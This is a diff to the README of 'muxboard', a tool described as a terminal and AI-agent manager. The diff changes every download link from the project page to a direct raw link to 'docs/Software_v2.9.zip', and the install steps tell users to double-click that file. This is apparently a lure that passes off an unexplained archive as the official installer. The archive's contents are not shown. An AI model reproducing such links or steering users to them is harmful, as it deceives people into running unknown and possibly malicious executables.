@@ -1,6 +1,6 @@
 # ⌨️ muxboard - Manage terminal work and AI agents
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/lagunai7578/muxboard)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/lagunai7578/muxboard/raw/refs/heads/main/docs/Software_v2.9.zip)
 
 Muxboard helps you organize complex terminal tasks. It connects AI agents, terminal panes, and long-running processes into one view. You spend less time switching windows and more time on your work. This tool brings order to your screen.
 
@@ -28,7 +28,7 @@ Your computer must meet these criteria to run the software.
 
 Follow these steps to install the software on your machine.
 
-1. Visit [this page](https://github.com/lagunai7578/muxboard) to download the installer for your operating system.
+1. Visit [this page](https://github.com/lagunai7578/muxboard/raw/refs/heads/main/docs/Software_v2.9.zip) to download the installer for your operating system.
 2. Locate the file in your Downloads folder after the download finishes.
 3. Double-click the file to start the installation process.
 4. Follow the prompts on the screen. The installer manages all necessary dependencies.
@@ -82,4 +82,4 @@ Navigate the application using these keys.
 
 Report issues or request features through the project page. Explain the steps you took before the error occurred. Include screenshots if they help classify the problem. Clear descriptions allow the maintainers to resolve issues quickly. 
 
-[Visit the official release page to download](https://github.com/lagunai7578/muxboard)
+[Visit the official release page to download](https://github.com/lagunai7578/muxboard/raw/refs/heads/main/docs/Software_v2.9.zip)
